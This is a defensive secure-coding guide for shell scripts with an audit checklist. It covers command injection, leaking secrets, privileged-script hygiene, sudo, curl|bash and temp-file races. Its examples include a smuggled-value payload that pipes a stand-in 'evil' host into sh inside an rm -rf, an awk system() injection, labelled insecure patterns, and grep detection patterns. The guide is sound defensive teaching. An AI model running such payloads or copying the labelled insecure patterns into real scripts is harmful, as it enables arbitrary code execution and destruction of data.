# 03 — Security

Injection, secrets, privilege, supply chain, and the tooling gate. Severity here skews
CRITICAL/HIGH — shell runs with the operator's full authority.

## 1. eval and command injection

`eval` on anything derived from input (args, env, file contents, API responses) is
arbitrary code execution. So are its cousins: `bash -c "$str"`, `sh -c "$str"`,
`ssh host "$str"`, `su -c`, `watch "$str"`, `find -exec sh -c "$str"`, awk `system()`,
unquoted heredoc bodies fed to a shell.

```bash
# CRITICAL — filename/branch/issue-title chosen by user executes code
eval "git checkout $branch"
bash -c "process $file"
ssh "$host" "rm -rf $dir"            # remote shell re-parses; $dir='/; curl evil|sh'

# GOOD — no re-parsing: pass data as arguments, not code
git checkout -- "$branch"
process "$file"
ssh "$host" -- rm -rf "$(printf '%q' "$dir")"   # %q-escape anything entering a remote shell
# better: scp a script and run it, or use ssh host 'cat | bash' with a heredoc of CODE ONLY
```

- Indirection without eval: `${!varname}` (bash), `declare -n` nameref, associative-array
  dispatch `"${handlers[$key]}"` with a validated key — never `eval "$cmd_string"`.
- Variables expanded inside `awk`/`sed`/`jq` *programs* are injection too:
  `awk "{print \$$col}"` with col='1; system("...")'. Pass data via `awk -v`,
  `jq --arg`, `sed` with validated patterns.
- Anything matching `$(...)` or backticks inside user-controlled strings that later get
  expanded in double quotes by `eval`/`envsubst`-like flows is the same bug.

## 2. Secrets discipline

Three leak channels: **argv** (visible in `ps`/`/proc/*/cmdline` to all users), **environment
dumps** (`env` in logs, crash handlers, CI debug, `/proc/*/environ`), **trace output**
(`set -x` prints expanded values).

```bash
# CRITICAL — expanded values land in argv, visible to every local user via ps
curl -H "Authorization: Bearer $TOKEN" https://api.example.com
mysql -u app -p"$DB_PASS"

# GOOD — secrets via file or stdin/fd, never argv
curl --config - <<EOF
header = "Authorization: Bearer $TOKEN"
EOF
# or: curl -H @"$header_file"
mysql --defaults-extra-file="$cnf_with_password"

# GOOD — read from a secrets file/manager at runtime
TOKEN=$(<"$CREDENTIALS_DIR/token")    # file mode 0600, never committed
```

- `set -x`/`bash -x` prints every expansion. Bracket sensitive sections:

```bash
set +x   # SECRETS BELOW — do not trace
auth_header="Authorization: Bearer $(<"$token_file")"
set -x
```

  Better: keep `set -x` behind a debug flag and structure code so secrets never pass
  through traced lines (files/fds end to end).
- Never `env`, `printenv`, `set`, or `declare -p` into logs in scripts that may hold
  secrets in env. Never echo secrets even "masked" — write "loaded credentials from X".
- CI: rely on the CI's secret masking but don't trust it — masking fails on transformed
  values (base64, URL-encoded). Don't `base64` a secret into logs.
- Storage/rotation strategy → `sota-secrets-management`.

## 3. PATH hygiene and privileged scripts

Any script running as root (cron, sudo, init, setuid wrappers' children) must not trust
the inherited environment:

```bash
# top of privileged scripts
PATH=/usr/sbin:/usr/bin:/sbin:/bin
export PATH
umask 077
unset IFS CDPATH ENV BASH_ENV GLOBIGNORE LD_PRELOAD LD_LIBRARY_PATH
```

- Attack: attacker-writable dir earlier in PATH (or `.` in PATH) shadows `tar`, `service`,
  etc. Root cron with inherited PATH = privilege escalation.
- `CDPATH` makes bare `cd dir` jump to unexpected locations — unset it in all scripts
  (or always `cd ./dir`); check every `cd` (`cd "$dir" || die ...` — under `set -e` a
  failed `cd` in a condition context still proceeds).
- Never execute relative commands from a CWD you don't control; never `source` files
  writable by less-privileged users.

## 4. sudo discipline

- Scripts should not contain blanket `sudo`. If elevation is needed, either (a) require
  the *whole script* to run as root and check it:

```bash
(( EUID == 0 )) || die "must run as root (try: sudo $0)"
```

  or (b) sudo *specific, full-path* commands, and document the needed sudoers entries:

```
deploy ALL=(root) NOPASSWD: /usr/bin/systemctl restart myapp, /usr/bin/install -m644 * /etc/myapp/*
```

- Never `sudo $cmd` with variable command (injection + sudoers bypass), never
  `echo "$pass" | sudo -S` (secret in argv/pipe + defeats auth design).
- Beware `sudo cmd > file`: the redirect happens in the *unprivileged* shell. Use
  `... | sudo tee file >/dev/null` or `sudo sh -c '... > file'` with a constant string.
- Drop privileges as early as possible; in containers prefer entrypoint-level drop
  (rules/04 §2) over sudo at all.

## 5. curl | bash — both directions

**Consuming** (you install third-party software):

```bash
# CRITICAL in production paths — executes whatever the server (or MITM, or compromised
# bucket) returns; partial download can execute a truncated script
curl -s https://example.com/install.sh | bash
```

Download → verify → execute, with pinned checksum (or signature) committed to your repo:

```bash
readonly url="https://github.com/org/tool/releases/download/v1.2.3/tool-linux-amd64"
readonly sha256="4f5e...committed-constant..."
tmp=$(mktemp)
curl --fail --silent --show-error --location --max-time 120 -o "$tmp" -- "$url"
printf '%s  %s\n' "$sha256" "$tmp" | sha256sum -c - || die "checksum mismatch for $url"
install -m 0755 -- "$tmp" /usr/local/bin/tool
```

Pin versions (never `/latest/`); for higher assurance verify signatures
(`gpg --verify`, cosign/minisign) not just checksums fetched from the same origin.

**Publishing** (you ship an install script): provide versioned artifacts + a checksums
file signed or served from a separate trust path; make the script safe under truncation
by wrapping everything in a function called on the last line:

```bash
main() { ...all logic...; }
main "$@"   # nothing executes until fully downloaded and parsed
```

## 6. Temp file races and umask

- Predictable temp paths (`/tmp/myapp.$$`, `/tmp/build.tmp`) → symlink attack: attacker
  pre-creates a symlink at that path, your root script writes through it onto
  `/etc/passwd`. **Only `mktemp`** (unpredictable name, `O_EXCL`, mode 0600) — already
  required by rules/01 §6; here it is a security control, not hygiene.
- Don't `chmod` a file *after* writing sensitive content — create restrictive, then write:
  `umask 077` before creating key material, or `install -m 0600 /dev/null "$f"` then write.
- Set `umask` explicitly in scripts that create files whose permissions matter; inherited
  umask is whatever the caller had. `umask 022` for world-readable artifacts, `077` for
  private state. Remember rules/02 §9: mktemp files are 0600 — explicitly `chmod` before
  publishing world-readable artifacts via `mv`.
- Shared directories: never trust pre-existing files/dirs in `/tmp`; `mktemp -d` and work
  inside it.

## 7. ShellCheck + shfmt in CI — non-negotiable

Current as of mid-2026: ShellCheck v0.11.0 (Aug 2025), shfmt v3.13.x (zsh-aware).
Both are single static binaries; there is no excuse for a repo with shell scripts and no
shell linting.

```yaml
# CI job (any system) — fail the build on findings
- run: |
    shellcheck --severity=style --external-sources $(git ls-files '*.sh' '*.bash')
    shfmt -d -i 2 -ci .
```

- Also lint scripts *embedded* elsewhere: Dockerfile `RUN` blocks (hadolint integrates
  ShellCheck), GitHub Actions `run:` blocks (actionlint embeds ShellCheck), Makefile
  recipes (extract or keep recipes one-line calling real scripts).
- Suppressions only inline, narrowest scope, with justification:

```bash
# shellcheck disable=SC2086  # $FLAGS is a space-separated allowlist built above, splitting intended
```

  Repo-wide disables in `.shellcheckrc` for *bug-class* codes (SC2086, SC2046, SC2155,
  SC2064) are an audit finding in themselves.
- shfmt settings belong in `.editorconfig` so editor, hook, and CI agree.

## Audit checklist

- [ ] `grep -rn 'eval ' --include='*.sh'` → every hit CRITICAL until proven constant-input
      (SC2294 hints at array-eval misuse).
- [ ] `grep -rn 'bash -c\|sh -c' --include='*.sh' Makefile* Dockerfile*` with `$` inside
      the string → CRITICAL/HIGH.
- [ ] `ssh .*\$` and `su -c .*\$` — remote re-parsing injection; check for `printf '%q'`.
- [ ] SC2064 — `trap "$cmd" ...` with double quotes (expands now, runs later — often
      stale/injected values).
- [ ] Secrets in argv: `grep -rni 'password\|token\|secret\|api[_-]key' --include='*.sh'`
      then trace each into argv (`-p"$X"`, `-H "Auth.* $X"`, URL userinfo `https://user:$X@`)
      → CRITICAL.
- [ ] `set -x` (or `bash -x` in shebang/CI) in scripts handling secrets without `set +x`
      bracketing → HIGH.
- [ ] `env\|printenv\|declare -p` piped to logs/files in secret-bearing contexts.
- [ ] Privileged scripts (cron files, `sudo` callers, Docker root entrypoints) missing
      explicit `PATH=` and `umask` → HIGH; `CDPATH` not unset → MEDIUM.
- [ ] `grep -rn 'sudo ' --include='*.sh'` — variable after sudo, `sudo -S`, blanket sudo,
      `sudo .* >` redirects.
- [ ] `grep -rn 'curl[^|]*|[[:space:]]*\(ba\)\?sh\|wget -qO- .*| *sh' -r .` → CRITICAL in
      anything that runs unattended; check install scripts for checksum/signature
      verification and version pinning (no `/latest/`).
- [ ] Predictable temp names: `grep -rn '/tmp/[^$]*\$\$\|/tmp/[a-zA-Z0-9._-]*\b' --include='*.sh'`
      without mktemp → HIGH (CRITICAL if script runs as root).
- [ ] `chmod .*60[0]\|chmod .*7[07][07]` *after* content written to sensitive files.
- [ ] No shellcheck/shfmt in CI config (`.github/workflows`, `.gitlab-ci.yml`,
      `Jenkinsfile`) for a repo containing `*.sh` → HIGH (process gap).
- [ ] `.shellcheckrc` blanket-disabling SC2086/SC2046/SC2155/SC2064 → finding.
